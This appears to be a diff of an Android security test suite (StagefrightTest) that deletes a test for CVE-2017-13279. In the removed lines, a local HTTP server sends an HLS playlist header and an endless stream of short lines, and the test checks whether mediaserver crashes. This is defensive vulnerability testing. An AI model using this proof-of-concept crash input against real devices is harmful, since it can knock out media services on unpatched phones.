@@ -51,9 +51,6 @@ import java.io.FileInputStream;
 import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.io.FileOutputStream;
-import java.io.OutputStream;
-import java.net.Socket;
-import java.net.ServerSocket;
 import java.io.File;
 import java.util.ArrayList;
 import java.util.HashMap;
@@ -793,86 +790,6 @@ public class StagefrightTest extends InstrumentationTestCase {
     @SecurityTest
     public void testStagefright_cve_2017_0474() throws Exception {
         doStagefrightTest(R.raw.cve_2017_0474, 120000);
-    }
-
-    @SecurityTest
-    public void testStagefright_cve_2017_13279() throws Exception {
-      Thread server = new Thread() {
-        @Override
-        public void run(){
-          try (ServerSocket serverSocket = new ServerSocket(8080);
-            Socket conn = serverSocket.accept()){
-              OutputStream stream = conn.getOutputStream();
-              byte http[] = ("HTTP/1.0 200 OK\r\nContent-Type: application/x-mpegURL\r\n\r\n"
-                           + "#EXTM3U\n#EXT-X-STREAM-INF:\n").getBytes();
-              stream.write(http);
-              while(!conn.isClosed())
-                stream.write(("a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\n"
-                    + "a\na\na\na\na\na\na\na\n").getBytes());
-            }
-          catch(IOException e){
-          }
-        }
-      };
-      server.start();
-      String uri = "http://127.0.0.1:8080/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
-                 + "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/"
-                 + "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.m3u8";
-      final MediaPlayerCrashListener mpcl = new MediaPlayerCrashListener();
-
-      LooperThread t = new LooperThread(new Runnable() {
-          @Override
-          public void run() {
-
-              MediaPlayer mp = new MediaPlayer();
-              mp.setOnErrorListener(mpcl);
-              mp.setOnPreparedListener(mpcl);
-              mp.setOnCompletionListener(mpcl);
-              Surface surface = getDummySurface();
-              mp.setSurface(surface);
-              AssetFileDescriptor fd = null;
-              try {
-                mp.setDataSource(uri);
-                mp.prepareAsync();
-              } catch (IOException e) {
-                Log.e(TAG, e.toString());
-              } finally {
-                  closeQuietly(fd);
-              }
-
-              Looper.loop();
-              mp.release();
-          }
-      });
-      t.start();
-      Thread.sleep(60000); // Poc takes a while to crash mediaserver, waitForError
-                           // doesn't wait long enough
-      assertFalse("Device *IS* vulnerable to CVE-2017-13279",
-                  mpcl.waitForError() == MediaPlayer.MEDIA_ERROR_SERVER_DIED);
-      t.stopLooper();
-      t.join(); // wait for thread to exit so we're sure the player was released
-      server.join();
     }
 
     @SecurityTest
